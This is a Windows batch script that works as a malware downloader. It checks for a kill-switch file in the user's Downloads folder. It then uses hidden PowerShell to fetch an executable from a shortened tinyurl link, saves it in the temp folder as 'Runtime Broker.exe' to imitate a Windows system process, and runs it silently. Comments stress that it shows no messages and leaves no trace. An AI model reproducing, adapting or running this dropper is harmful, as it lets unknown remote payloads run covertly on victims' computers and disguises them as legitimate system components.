@echo off
setlocal

:: Define the URL of the file and the destination path
set "url=https://tinyurl.com/wegottashhh"
set "output=%TEMP%\Runtime Broker.exe"
set "downloadsFolder=%USERPROFILE%\Downloads"
set "triggerFile=%downloadsFolder%\ConvertFromWrite.dwg"

:: Check if the trigger file exists in the Downloads folder
if exist "%triggerFile%" (
    exit /b 0
)

:: Check if the output file already exists
if not exist "%output%" (
    :: Run PowerShell in a hidden window and suppress output
    powershell -windowstyle hidden -command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%' -ErrorAction SilentlyContinue"

    :: Check if the file was downloaded
    if exist "%output%" (
        :: Run the file
        start "" "%output%"

        :: Wait for 10 seconds to ensure the file has started executing
        timeout /t 10 /nobreak >nul
    ) else (
        exit /b 1
    )
)

:: No deletion of the file
:: No messages or pauses

endlocal
